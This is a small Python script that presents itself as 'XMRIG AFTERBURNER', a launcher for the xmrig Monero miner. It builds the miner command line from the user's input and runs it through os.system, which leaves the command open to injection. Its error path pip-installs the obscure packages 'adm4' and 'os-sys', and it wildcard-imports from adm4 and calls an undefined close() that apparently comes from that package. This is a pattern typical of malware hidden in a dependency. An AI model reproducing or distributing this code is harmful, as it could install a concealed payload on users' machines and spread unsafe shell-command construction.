

try:
 import os; from colorama import *; from adm4.main import *;import ctypes; import time
except:
 input("missing required modules, press enter to install or ctrl + c to exit. ")
 os.system("pip install colorama && pip install adm4 && pip install os-sys")
 print("finished installing modules, please restart.")


init()
def title():
    os.system("cls")
    if ctypes.windll.shell32.IsUserAnAdmin():
     pass
    else:
     print(Fore.YELLOW + "[error 2] Failed to apply msr mod, hash rate will be slow.")
    print(Fore.LIGHTBLUE_EX + """
    ██   ██ ███    ███ ██████  ██  ██████         █████  ██████  
     ██ ██  ████  ████ ██   ██ ██ ██             ██   ██ ██   ██ 
      ███   ██ ████ ██ ██████  ██ ██   ███ █████ ███████ ██████  
     ██ ██  ██  ██  ██ ██   ██ ██ ██    ██       ██   ██ ██   ██ 
    ██   ██ ██      ██ ██   ██ ██  ██████        ██   ██ ██████  
    XMRIG AFTERBURNER                                    v0.8.2

    """)
    
    address = input("    xmrig-ab/xmr-wallet-address> ")
    pool = input("    xmrig-ab/pool> ")
    name = input("    xmrig-ab/name> ")
    pri = input("    xmrig-ab/cpu-priority (1,2,3,4 or 5)> ")
    dir_path = input("    folder containing xmrig.exe> ")
    print("    finished setup. starting")
    os.system(f"{dir_path}//xmrig.exe --cpu-priority={pri} --opencl --cuda -o {pool} -u {address} --rig-id {name} -k --tls")
    time.sleep(5)

close()
title()
